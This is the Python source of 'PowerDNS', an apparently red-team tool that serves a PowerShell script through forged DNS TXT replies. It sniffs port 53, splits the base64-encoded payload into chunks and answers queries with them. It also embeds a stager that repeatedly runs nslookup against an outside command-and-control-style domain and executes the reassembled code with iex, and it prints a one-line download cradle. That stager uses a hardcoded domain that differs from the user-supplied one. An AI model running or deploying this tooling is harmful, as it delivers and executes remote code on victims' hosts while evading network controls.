# PowerDNS: A tool for performing Powershell DNS Delivery
# Author: Dominic Chell <dominic@mdsec.co.uk>
# MDSec ActiveBreach Team

import scapy, sys
from scapy.all import *
import base64
import signal
import argparse

INTERFACE = 'eth0'
chunks = []
domain = ''

def validate_args():
    parser = argparse.ArgumentParser(description = "")
    parser.add_argument("--file", metavar="<file>", dest = "file", default = None, help = "Powershell file to serve")
    parser.add_argument("--domain", metavar="<domain>", dest = "domain", default = None, help = "Domain with auth NS record")
    args = parser.parse_args()
    if not args.file or not args.domain:
        print "\033[1;34m[*]\033[0;0m PowerDNS: The --file and --domain arguments are required"
        sys.exit(-1)
    return args

def show_banner():
    with open('banner.txt', 'r') as f:
        data = f.read()
        print "\033[92m%s\033[0;0m" % data

def signal_handler(signal, frame):
        print('\033[1;34m[*] PowerDNS:\033[0;0m Exiting')
        sys.exit(0)

def base64_file(file):
    try:
        with open(file, "rb") as powershell_file:
            encoded_string = base64.b64encode(powershell_file.read())
        return encoded_string
    except:
        print("\033[1;34m[*] PowerDNS:\033[0;0m Error opening file")
        sys.exit(-1)

def get_chunks(file):
    tmp_chunks = []
    encoded_file = base64_file(file)
    for i in range(0,len(encoded_file), 250):
    	tmp_chunks.append(encoded_file[i:i+250])
    return tmp_chunks

def powerdnsHandler(data):
    if data.haslayer(DNS) and data.haslayer(DNSQR):
        global chunks
        ip = data.getlayer(IP)
        udp = data.getlayer(UDP)
        dns = data.getlayer(DNS)
        dnsqr = data.getlayer(DNSQR)

        print('\033[1;34m[*] PowerDNS:\033[0;0m Received DNS Query for %s from %s' % (dnsqr.qname, ip.src))

        if len(dnsqr.qname) !=0 and dnsqr.qtype == 16:
            try:
                response = chunks[int(dnsqr.qname.split('.')[0])]
            except:
                return
            rdata=response
            rcode=0
            dn = domain
            an = (None, DNSRR(rrname=dnsqr.qname, type='TXT', rdata=rdata, ttl=1))[rcode == 0]
            ns = DNSRR(rrname=dnsqr.qname, type="NS", ttl=1, rdata="ns1."+dn)
            forged = IP(id=ip.id, src=ip.dst, dst=ip.src) /UDP(sport=udp.dport, dport=udp.sport) /  DNS(id=dns.id, qr=1, rd=1, ra=1, rcode=rcode, qd=dnsqr, an=an, ns=ns)
            send(forged, verbose=0, iface=INTERFACE)
try:
    show_banner()
    args = validate_args()
    signal.signal(signal.SIGINT, signal_handler)
    chunks = get_chunks(args.file)
    domain = args.domain
    STAGER_CMD = "for ($i=1;$i -le %s;$i++){$b64+=iex(nslookup -q=txt -timeout=3 $i'.dprk-c2-server.co.uk')[-1]};iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(($b64))))" % (str(len(chunks)))

    print("\033[1;34m[*] PowerDNS:\033[0;0m Splitting %s in to %s chunk(s)" % (args.file, str(len(chunks))))
    chunks.insert(0,STAGER_CMD)
    print("\033[1;34m[*] PowerDNS:\033[0;0m Use the following download cradle:\n\033[1;34m[*] PowerDNS:\033[0;0m powershell \"powershell (nslookup -q=txt -timeout=5 0.%s)[-1]\"" % (domain))

    while True:
		mSniff = sniff(filter="udp dst port 53", iface=INTERFACE, prn=powerdnsHandler)
except Exception as e:
    sys.exit(-1)
